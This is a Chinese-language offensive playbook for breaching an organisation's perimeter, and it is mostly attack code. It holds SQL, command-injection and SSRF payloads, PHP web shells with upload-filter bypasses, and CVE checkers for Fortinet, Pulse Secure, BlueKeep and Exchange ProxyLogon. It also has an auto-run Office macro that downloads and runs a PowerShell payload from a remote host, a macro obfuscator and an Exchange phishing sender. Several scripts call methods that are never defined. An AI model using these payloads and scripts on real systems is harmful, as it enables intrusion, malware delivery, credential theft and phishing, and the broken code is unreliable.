# 外部边界突破 (External Perimeter)

## Web漏洞利用

### 注入攻击

#### SQL注入
```sql
-- 基础SQL注入测试
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
' UNION SELECT null--
' UNION SELECT null,null--

-- 联合查询注入
' UNION SELECT 1,2,3--
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,column_name,null FROM information_schema.columns--

-- 基于错误的注入
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--

-- 盲注
' AND LENGTH(database())>5--
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--
```

#### SQL注入自动化
```python
# sql_injection_tester.py
import requests
import string
import time

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_union_injection(self, param):
        """测试联合查询注入"""
        payloads = [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT database(),user(),version()--",
            "' UNION SELECT table_name,column_name,null FROM information_schema.tables LIMIT 5--"
        ]
        
        for payload in payloads:
            params = {param: payload}
            response = self.session.get(self.target_url, params=params)
            
            if response.status_code == 200:
                print(f"[+] Potential SQL injection with payload: {payload}")
                return True
        
        return False
    
    def extract_data_blind(self, param):
        """基于盲注提取数据"""
        result = ""
        position = 1
        
        while True:
            char_found = False
            for char in string.printable:
                payload = f"' AND SUBSTRING(database(),{position},1)='{char}'--"
                params = {param: payload}
                response = self.session.get(self.target_url, params=params)
                
                if response.status_code == 200 and "error" not in response.text.lower():
                    result += char
                    print(f"[+] Found character: {char}")
                    char_found = True
                    break
            
            if not char_found:
                break
            
            position += 1
        
        return result
    
    def automated_sql_injection(self):
        """自动化SQL注入测试"""
        print(f"[*] Starting SQL injection test on {self.target_url}")
        
        # 测试参数
        test_params = ['id', 'user', 'product', 'search']
        
        for param in test_params:
            print(f"[*] Testing parameter: {param}")
            
            if self.test_union_injection(param):
                print(f"[+] Union-based SQL injection found in parameter: {param}")
                
                # 尝试提取数据
                database = self.extract_data_blind(param)
                if database:
                    print(f"[+] Extracted database name: {database}")
            
            time.sleep(1)  # 避免过快
```

### 命令注入
```bash
# 基础命令注入测试
;id
|id
`id`
$(id)
&&id
||id

# 绕过过滤
;id;
id%0A
id%0D%0A
%0Aid%0A
%26%26id%26%26

# 编码绕过
%3B%69%64%0A                          # ;id\n%60%69%64%60                          # `id`
%24%28%69%64%29                        # $(id)
```

#### 命令注入自动化
```python
# command_injection_tester.py
import requests
import base64
import urllib.parse

class CommandInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.test_commands = [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "ls -la",
            "pwd"
        ]
    
    def test_basic_injection(self, param):
        """测试基础命令注入"""
        injection_payloads = [
            ";{cmd}",
            "|{cmd}",
            "`{cmd}`,",
            "$({cmd})",
            "&&{cmd}",
            "||{cmd}"
        ]
        
        for cmd in self.test_commands:
            for payload_template in injection_payloads:
                payload = payload_template.format(cmd=cmd)
                params = {param: payload}
                
                try:
                    response = requests.get(self.target_url, params=params, timeout=10)
                    
                    # 检查命令执行结果
                    if "uid=" in response.text or "root" in response.text:
                        print(f"[+] Command injection found with payload: {payload}")
                        return True
                except:
                    pass
        
        return False
    
    def test_blind_injection(self, param):
        """测试盲命令注入"""
        blind_payloads = [
            ";sleep 5",
            "|sleep 5",
            "`sleep 5`,",
            "$(sleep 5)",
            "&&sleep 5",
            "||sleep 5"
        ]
        
        for payload in blind_payloads:
            params = {param: payload}
            
            start_time = time.time()
            try:
                response = requests.get(self.target_url, params=params, timeout=3)
                end_time = time.time()
                
                # 检查是否有时间延迟
                if end_time - start_time > 4:
                    print(f"[+] Blind command injection found with payload: {payload}")
                    return True
            except:
                pass
        
        return False
```

### 文件上传漏洞

#### 文件上传绕过
```php
// 绕过文件类型检查
shell.php.jpg
shell.php5
shell.pHp
shell.php%00.jpg    // 空字节绕过
shell.php\x00.jpg   // 十六进制空字节

// 绕过MIME类型检查
Content-Type: image/jpeg
Content-Type: application/octet-stream

// 绕过内容检查
GIF89a
<?php system($_GET['cmd']); ?>

// .htaccess绕过
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
```

#### 文件上传利用
```python
# file_upload_exploiter.py
import requests
import os

class FileUploadExploiter:
    def __init__(self, upload_url):
        self.upload_url = upload_url
        self.php_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            '<?php eval($_POST["cmd"]); ?>'
        ]
    
    def create_malicious_files(self):
        """创建恶意文件"""
        malicious_files = []
        
        # PHP文件
        for i, payload in enumerate(self.php_payloads):
            filename = f"shell{i}.php"
            with open(filename, 'w') as f:
                f.write(payload)
            malicious_files.append(filename)
        
        # 绕过文件
        bypass_files = [
            ("shell.php.jpg", "<?php system($_GET['cmd']); ?>"),
            ("shell.pHp", "<?php system($_GET['cmd']); ?>"),
            (".htaccess", "AddType application/x-httpd-php .jpg"),
            ("shell.php%00.jpg", "GIF89a\n<?php system($_GET['cmd']); ?>")
        ]
        
        for filename, content in bypass_files:
            with open(filename, 'w') as f:
                f.write(content)
            malicious_files.append(filename)
        
        return malicious_files
    
    def upload_and_test(self, malicious_files):
        """上传并测试文件"""
        upload_results = []
        
        for filename in malicious_files:
            try:
                # 上传文件
                with open(filename, 'rb') as f:
                    files = {'file': (filename, f)}
                    response = requests.post(self.upload_url, files=files)
                
                if response.status_code == 200:
                    print(f"[+] File {filename} uploaded successfully")
                    
                    # 尝试访问上传的文件
                    # 这里需要根据实际的上传路径来构造URL
                    file_url = self.upload_url.replace('/upload', f'/uploads/{filename}')
                    test_response = requests.get(file_url)
                    
                    if test_response.status_code == 200 and "system" in test_response.text:
                        print(f"[+] Web shell accessible at: {file_url}")
                        upload_results.append({
                            'filename': filename,
                            'url': file_url,
                            'status': 'working'
                        })
                
            except Exception as e:
                print(f"[!] Error uploading {filename}: {e}")
            finally:
                # 清理文件
                if os.path.exists(filename):
                    os.remove(filename)
        
        return upload_results
```

### 服务端请求伪造 (SSRF)

#### SSRF漏洞测试
```http
# 基础SSRF测试
http://localhost
http://127.0.0.1
http://0.0.0.0
http://169.254.169.254/latest/meta-data/

# 绕过过滤
http://2130706433/                            # 十进制IP
http://0x7f.0.0.1/                            # 十六进制IP
http://0177.0.0.1/                            # 八进制IP
http://localhost.localdomain/                 # 域名变体
http://127.1/                                 # 简写形式

# 协议绕过
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0a%0d%0a
file:///etc/passwd
dict://127.0.0.1:11211/
ldap://127.0.0.1:389/
sftp://127.0.0.1/
tftp://127.0.0.1/
```

#### SSRF自动化测试
```python
# ssrf_tester.py
import requests
import urllib.parse
import base64

class SSRFTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.ssrf_payloads = [
            # 基础SSRF
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            
            # IP绕过
            "http://2130706433/",                    # 127.0.0.1十进制
            "http://0x7f.0.0.1/",                    # 127.0.0.1十六进制
            "http://0177.0.0.1/",                    # 127.0.0.1八进制
            
            # 域名绕过
            "http://localhost.localdomain/",
            "http://127.1/",
            "http://0x7f001/",                       # 127.0.0.1十六进制组合
            
            # AWS元数据
            "http://169.254.169.254/latest/meta-data/",
            "http://instance-data/latest/meta-data/",
            
            # 协议绕过
            "file:///etc/passwd",
            "file:///C:/Windows/System32/drivers/etc/hosts",
            "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0a%0d%0a",
            "dict://127.0.0.1:11211/",
            "ldap://127.0.0.1:389/"
        ]
    
    def test_ssrf_vulnerability(self, param):
        """测试SSRF漏洞"""
        print(f"[*] Testing SSRF on parameter: {param}")
        
        successful_payloads = []
        
        for payload in self.ssrf_payloads:
            try:
                # URL编码payload
                encoded_payload = urllib.parse.quote(payload, safe='')
                
                # 构造参数
                params = {param: payload}
                
                # 发送请求
                response = requests.get(self.target_url, params=params, timeout=10)
                
                # 检查响应
                if self.detect_ssrf_success(response, payload):
                    print(f"[+] SSRF vulnerability confirmed with payload: {payload}")
                    successful_payloads.append(payload)
                
            except Exception as e:
                print(f"[!] Error testing payload {payload}: {e}")
        
        return successful_payloads
    
    def detect_ssrf_success(self, response, payload):
        """检测SSRF是否成功"""
        # 检查AWS元数据
        if "ami-id" in response.text or "instance-id" in response.text:
            return True
        
        # 检查文件读取
        if "root:" in response.text or "localhost" in response.text:
            return True
        
        # 检查响应时间（盲SSRF）
        if "169.254.169.254" in payload and response.elapsed.total_seconds() > 2:
            return True
        
        # 检查状态码
        if response.status_code == 200 and len(response.text) > 100:
            return True
        
        return False
    
    def test_aws_metadata_exposure(self, param):
        """测试AWS元数据暴露"""
        metadata_endpoints = [
            "latest/meta-data/",
            "latest/meta-data/ami-id",
            "latest/meta-data/instance-id",
            "latest/meta-data/public-ipv4",
            "latest/meta-data/iam/info",
            "latest/meta-data/iam/security-credentials/"
        ]
        
        metadata_data = {}
        
        for endpoint in metadata_endpoints:
            payload = f"http://169.254.169.254/{endpoint}"
            
            try:
                params = {param: payload}
                response = requests.get(self.target_url, params=params, timeout=5)
                
                if response.status_code == 200 and response.text:
                    metadata_data[endpoint] = response.text.strip()
                    print(f"[+] AWS metadata exposed: {endpoint}")
            
            except Exception as e:
                print(f"[!] Error accessing {endpoint}: {e}")
        
        return metadata_data
```

## 已知漏洞利用 (N-day)

### VPN漏洞

#### Fortinet SSL VPN
```python
# fortinet_vpn_exploit.py
import requests
import ssl
import urllib3

class FortinetVPNExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def check_cve_2018_13379(self):
        """检查CVE-2018-13379"""
        vuln_path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        
        try:
            response = requests.get(
                self.target_url + vuln_path,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200 and "fgt_lang" in response.text:
                print(f"[+] CVE-2018-13379 confirmed on {self.target_url}")
                return True
        
        except Exception as e:
            print(f"[!] Error checking CVE-2018-13379: {e}")
        
        return False
    
    def check_cve_2022_40684(self):
        """检查CVE-2022-40684"""
        # 尝试访问管理接口
        admin_paths = [
            "/api/v2/cmdb/system/admin",
            "/api/v2/cmdb/user/local",
            "/api/v2/cmdb/system/interface"
        ]
        
        headers = {
            "User-Agent": "Node.js",
            "Forwarded": "for=127.0.0.1",
            "X-Forwarded-Vdom": "root"
        }
        
        for path in admin_paths:
            try:
                response = requests.get(
                    self.target_url + path,
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"[+] Potential CVE-2022-40684 on {self.target_url}{path}")
                    return True
            
            except Exception as e:
                print(f"[!] Error checking {path}: {e}")
        
        return False
```

#### Pulse Secure VPN
```python
# pulse_secure_vpn_exploit.py
import requests
import json

class PulseSecureVPNExploit:
    def __init__(self, target_url):
        self.target_url = target_url
    
    def check_cve_2019_11510(self):
        """检查CVE-2019-11510"""
        vuln_paths = [
            "/dana-na/../dana/htmlacc/accexport/http:\localhost\local\userfiles",
            "/dana-na/../dana/htmlacc/accexport/http:\localhost\local\config\users.xml",
            "/dana-na/../dana/htmlacc/accexport/http:\localhost\data\users.xml"
        ]
        
        for path in vuln_paths:
            try:
                response = requests.get(
                    self.target_url + path,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200 and ("users.xml" in response.text or "userfiles" in response.text):
                    print(f"[+] CVE-2019-11510 confirmed on {self.target_url}{path}")
                    return True
            
            except Exception as e:
                print(f"[!] Error checking {path}: {e}")
        
        return False
    
    def check_cve_2020_8260(self):
        """检查CVE-2020-8260"""
        # 尝试访问管理接口
        admin_paths = [
            "/admin/",
            "/dana-admin/",
            "/dana-na/auth/"
        ]
        
        for path in admin_paths:
            try:
                response = requests.get(
                    self.target_url + path,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200 and "admin" in response.text.lower():
                    print(f"[+] Admin interface accessible on {self.target_url}{path}")
                    return True
            
            except Exception as e:
                print(f"[!] Error checking {path}: {e}")
        
        return False
```

### 远程桌面 (RDP) 漏洞

#### BlueKeep (CVE-2019-0708)
```python
# rdp_bluekeep_exploit.py
import socket
import struct

class RDPBlueKeepExploit:
    def __init__(self, target_ip, target_port=3389):
        self.target_ip = target_ip
        self.target_port = target_port
    
    def check_vulnerability(self):
        """检查BlueKeep漏洞"""
        try:
            # 建立RDP连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            
            # 发送RDP初始连接请求
            rdp_packet = self.create_rdp_connection_request()
            sock.send(rdp_packet)
            
            # 接收响应
            response = sock.recv(1024)
            
            # 分析响应
            if self.analyze_rdp_response(response):
                print(f"[+] BlueKeep vulnerability likely present on {self.target_ip}")
                return True
            
            sock.close()
            
        except Exception as e:
            print(f"[!] Error checking BlueKeep: {e}")
        
        return False
    
    def create_rdp_connection_request(self):
        """创建RDP连接请求"""
        # RDP初始连接请求
        packet = b''
        packet += b'\x03\x00'  # TPKT Header
        packet += b'\x00\x08'  # Length
        packet += b'\x02\xf0\x80'  # X.224 Data
        packet += b'\x7f\x65\x82'  # Connection Request
        
        return packet
    
    def analyze_rdp_response(self, response):
        """分析RDP响应"""
        # 简化的BlueKeep检测逻辑
        if len(response) > 10 and b'\x03\x00' in response[:2]:
            # 检查特定的漏洞指示器
            if b'\x02\xf0\x80' in response:
                return True
        
        return False
```

### Exchange服务器漏洞

#### ProxyLogon (CVE-2021-26855)
```python
# exchange_proxylogon_exploit.py
import requests
import xml.etree.ElementTree as ET

class ExchangeProxyLogonExploit:
    def __init__(self, target_url):
        self.target_url = target_url
    
    def check_cve_2021_26855(self):
        """检查CVE-2021-26855 (ProxyLogon)"""
        vuln_paths = [
            "/owa/auth/x.js",
            "/ecp/default.flt",
            "/ecp/main.css",
            "/owa/auth/Current/themes/resources/logon.css"
        ]
        
        headers = {
            "Cookie": "X-AnonResource=true",
            "Accept-Language": "en-US"
        }
        
        for path in vuln_paths:
            try:
                # 尝试访问管理接口
                admin_test = self.test_admin_access(path)
                if admin_test:
                    print(f"[+] Potential ProxyLogon vulnerability on {self.target_url}{path}")
                    return True
                
                # 检查特定的响应模式
                response = requests.get(
                    self.target_url + path,
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 302 and "X-AnonResource" in response.headers:
                    print(f"[+] ProxyLogon vulnerability likely on {self.target_url}{path}")
                    return True
            
            except Exception as e:
                print(f"[!] Error checking {path}: {e}")
        
        return False
    
    def test_admin_access(self, base_path):
        """测试管理访问"""
        admin_endpoints = [
            "/ecp/?rfr=owa&p=PersonalSettings",
            "/ecp/?rfr=owa&p=Admin",
            "/ecp/DDI/DDIService.svc/GetObject"
        ]
        
        for endpoint in admin_endpoints:
            try:
                response = requests.get(
                    self.target_url + base_path + endpoint,
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200 and "admin" in response.text.lower():
                    return True
            
            except:
                pass
        
        return False
```

## 办公系统漏洞

### Microsoft Office

#### 宏文档攻击
```vba
' malicious_macro.vba
Sub AutoOpen()
    ' 自动执行宏
    ExecutePayload
End Sub

Sub Document_Open()
    ' 文档打开时执行
    ExecutePayload
End Sub

Function ExecutePayload()
    On Error Resume Next
    
    ' 下载并执行Payload
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' PowerShell下载器
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
          "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')"
    
    objShell.Run cmd, 0, False
    
    ' 隐藏痕迹
    Application.DisplayAlerts = False
End Function
```

#### Office文档混淆
```python
# office_obfuscator.py
from oletools.olevba import VBA_Parser
import random
import string

class OfficeObfuscator:
    def __init__(self):
        self.var_mappings = {}
        self.func_mappings = {}
    
    def generate_random_name(self, length=8):
        """生成随机变量名"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def obfuscate_vba_code(self, vba_code):
        """混淆VBA代码"""
        # 替换变量名
        lines = vba_code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            # 简单的变量名替换
            if 'Dim ' in line:
                # 提取变量名
                parts = line.split()
                if len(parts) >= 3:
                    var_name = parts[2].replace(',', '')
                    if var_name not in self.var_mappings:
                        self.var_mappings[var_name] = self.generate_random_name()
                    
                    line = line.replace(var_name, self.var_mappings[var_name])
            
            # 字符串分割
            if '"' in line:
                # 简单的字符串混淆
                line = self.obfuscate_strings(line)
            
            obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)
    
    def obfuscate_strings(self, line):
        """混淆字符串"""
        # 简单的字符串分割
        if '"http://' in line or '"https://' in line:
            # 分割URL
            parts = line.split('"')
            if len(parts) >= 3:
                url = parts[1]
                # 分割URL
                protocol, rest = url.split('://', 1)
                obfuscated_url = f'" & "{protocol}" & "://" & "{rest}" & "'
                line = line.replace(f'"{url}"', obfuscated_url)
        
        return line
```

### 邮件系统漏洞

#### Exchange漏洞利用
```python
# exchange_exploitation.py
import requests
import json
from datetime import datetime

class ExchangeExploiter:
    def __init__(self, target_url, username, password):
        self.target_url = target_url
        self.username = username
        self.password = password
        self.session = requests.Session()
    
    def authenticate_exchange(self):
        """认证Exchange"""
        auth_url = f"{self.target_url}/owa/auth.owa"
        
        auth_data = {
            "username": self.username,
            "password": self.password,
            "destination": f"{self.target_url}/owa/"
        }
        
        try:
            response = self.session.post(auth_url, data=auth_data)
            
            if response.status_code == 302:
                print(f"[+] Exchange authentication successful")
                return True
            else:
                print(f"[!] Exchange authentication failed")
                return False
        
        except Exception as e:
            print(f"[!] Exchange authentication error: {e}")
            return False
    
    def extract_global_address_list(self):
        """提取全局地址列表"""
        gal_url = f"{self.target_url}/owa/service.svc?action=GetPeopleFilters&EP=1"
        
        try:
            response = self.session.get(gal_url)
            
            if response.status_code == 200:
                # 解析全局地址列表
                users = self.parse_global_address_list(response.text)
                print(f"[+] Extracted {len(users)} users from GAL")
                return users
        
        except Exception as e:
            print(f"[!] Error extracting GAL: {e}")
        
        return []
    
    def send_phishing_email(self, recipients, subject, body, attachment_path=None):
        """发送钓鱼邮件"""
        send_url = f"{self.target_url}/owa/service.svc?action=SendMessage&EP=1"
        
        # 构造邮件数据
        email_data = {
            "to": recipients,
            "subject": subject,
            "body": body,
            "importance": "High",
            "readReceipt": True
        }
        
        if attachment_path:
            # 添加附件逻辑
            email_data["attachments"] = [attachment_path]
        
        try:
            response = self.session.post(send_url, json=email_data)
            
            if response.status_code == 200:
                print(f"[+] Phishing email sent successfully")
                return True
        
        except Exception as e:
            print(f"[!] Error sending phishing email: {e}")
        
        return False
```

## 自动化漏洞扫描

### 综合漏洞扫描器
```python
# comprehensive_vuln_scanner.py
import subprocess
import json
import concurrent.futures
from datetime import datetime
import os

class ComprehensiveVulnScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.scan_results = {}
        self.timestamp = datetime.now().isoformat()
    
    def scan_sql_injection(self):
        """SQL注入扫描"""
        print(f"[*] Scanning for SQL injection vulnerabilities...")
        
        try:
            # 使用SQLMap
            cmd = f"sqlmap -u {self.target_url} --batch --random-agent --level=3 --risk=2 --output-dir=sqlmap_results"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            
            if "Parameter" in result.stdout and "is vulnerable" in result.stdout:
                return {
                    'vulnerable': True,
                    'tool': 'sqlmap',
                    'output': result.stdout[:500]  # 限制输出长度
                }
        
        except subprocess.TimeoutExpired:
            print(f"[!] SQLMap scan timed out")
        except Exception as e:
            print(f"[!] SQL injection scan error: {e}")
        
        return {'vulnerable': False, 'tool': 'sqlmap'}
    
    def scan_command_injection(self):
        """命令注入扫描"""
        print(f"[*] Scanning for command injection vulnerabilities...")
        
        # 使用自定义扫描器
        cmd_tester = CommandInjectionTester(self.target_url)
        result = cmd_tester.auto_scan()
        
        return {
            'vulnerable': len(result) > 0,
            'findings': result,
            'tool': 'custom_scanner'
        }
    
    def scan_file_upload(self):
        """文件上传扫描"""
        print(f"[*] Scanning for file upload vulnerabilities...")
        
        # 使用自定义扫描器
        upload_tester = FileUploadExploiter(self.target_url)
        malicious_files = upload_tester.create_malicious_files()
        results = upload_tester.upload_and_test(malicious_files)
        
        return {
            'vulnerable': len(results) > 0,
            'findings': results,
            'tool': 'custom_scanner'
        }
    
    def scan_ssrf(self):
        """SSRF扫描"""
        print(f"[*] Scanning for SSRF vulnerabilities...")
        
        # 使用自定义扫描器
        ssrf_tester = SSRFTester(self.target_url)
        results = ssrf_tester.auto_ssrf_test()
        
        return {
            'vulnerable': len(results) > 0,
            'findings': results,
            'tool': 'custom_scanner'
        }
    
    def scan_known_vulnerabilities(self):
        """扫描已知漏洞"""
        print(f"[*] Scanning for known vulnerabilities...")
        
        known_vulns = []
        
        # 检查常见VPN漏洞
        vpn_checks = [
            ('Fortinet SSL VPN', FortinetVPNExploit(self.target_url)),
            ('Pulse Secure VPN', PulseSecureVPNExploit(self.target_url))
        ]
        
        for vuln_name, checker in vpn_checks:
            try:
                if checker.check_vulnerabilities():
                    known_vulns.append({
                        'name': vuln_name,
                        'status': 'vulnerable',
                        'severity': 'critical'
                    })
            except:
                pass
        
        # 检查Exchange漏洞
        try:
            exchange_checker = ExchangeProxyLogonExploit(self.target_url)
            if exchange_checker.check_cve_2021_26855():
                known_vulns.append({
                    'name': 'Exchange ProxyLogon',
                    'cve': 'CVE-2021-26855',
                    'status': 'vulnerable',
                    'severity': 'critical'
                })
        except:
            pass
        
        return {
            'vulnerable': len(known_vulns) > 0,
            'findings': known_vulns,
            'tool': 'known_vulnerability_scanner'
        }
    
    def run_comprehensive_scan(self):
        """运行综合扫描"""
        print(f"[*] Starting comprehensive vulnerability scan on {self.target_url}")
        
        # 定义扫描任务
        scan_tasks = {
            'sql_injection': self.scan_sql_injection,
            'command_injection': self.scan_command_injection,
            'file_upload': self.scan_file_upload,
            'ssrf': self.scan_ssrf,
            'known_vulnerabilities': self.scan_known_vulnerabilities
        }
        
        # 并行执行扫描任务
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = {name: executor.submit(task) for name, task in scan_tasks.items()}
            
            for name, future in futures.items():
                try:
                    result = future.result(timeout=600)  # 10分钟超时
                    self.scan_results[name] = result
                except concurrent.futures.TimeoutError:
                    print(f"[!] {name} scan timed out")
                    self.scan_results[name] = {'vulnerable': False, 'error': 'timeout'}
                except Exception as e:
                    print(f"[!] {name} scan error: {e}")
                    self.scan_results[name] = {'vulnerable': False, 'error': str(e)}
        
        # 生成报告
        self.generate_scan_report()
        
        print("[+] Comprehensive scan completed")
        return self.scan_results
    
    def generate_scan_report(self):
        """生成扫描报告"""
        report = {
            'target': self.target_url,
            'timestamp': self.timestamp,
            'summary': {
                'total_scans': len(self.scan_results),
                'vulnerable_scans': len([r for r in self.scan_results.values() if r.get('vulnerable')]),
                'critical_findings': 0,
                'high_findings': 0,
                'medium_findings': 0,
                'low_findings': 0
            },
            'findings': self.scan_results,
            'recommendations': []
        }
        
        # 统计严重程度
        for scan_type, result in self.scan_results.items():
            if result.get('vulnerable'):
                if 'critical' in result.get('severity', '').lower():
                    report['summary']['critical_findings'] += 1
                elif 'high' in result.get('severity', '').lower():
                    report['summary']['high_findings'] += 1
                elif 'medium' in result.get('severity', '').lower():
                    report['summary']['medium_findings'] += 1
                else:
                    report['summary']['low_findings'] += 1
        
        # 生成建议
        if report['summary']['critical_findings'] > 0:
            report['recommendations'].append({
                'priority': 'CRITICAL',
                'description': f"Immediate attention required: {report['summary']['critical_findings']} critical vulnerabilities found",
                'action': 'Patch critical vulnerabilities immediately'
            })
        
        if report['summary']['high_findings'] > 0:
            report['recommendations'].append({
                'priority': 'HIGH',
                'description': f"High priority: {report['summary']['high_findings']} high-severity vulnerabilities found",
                'action': 'Schedule patching within 24-48 hours'
            })
        
        # 保存报告
        with open(f'scan_report_{self.target_url.replace("://", "_").replace("/", "_")}.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Scan report saved: scan_report_{self.target_url.replace("://", "_").replace("/", "_")}.json")
        
        return report
```

---

## 实战检查清单

### 外部边界突破
- [ ] Web漏洞扫描已完成
- [ ] SQL注入已测试
- [ ] 命令注入已检查
- [ ] 文件上传已验证
- [ ] SSRF漏洞已扫描

### N-day漏洞利用
- [ ] VPN漏洞已检查
- [ ] RDP漏洞已验证
- [ ] Exchange漏洞已扫描
- [ ] Office漏洞已测试
- [ ] 已知漏洞已利用

### 自动化扫描
- [ ] 综合扫描已运行
- [ ] 扫描结果已分析
- [ ] 漏洞报告已生成
- [ ] 修复建议已制定
- [ ] 后续测试已规划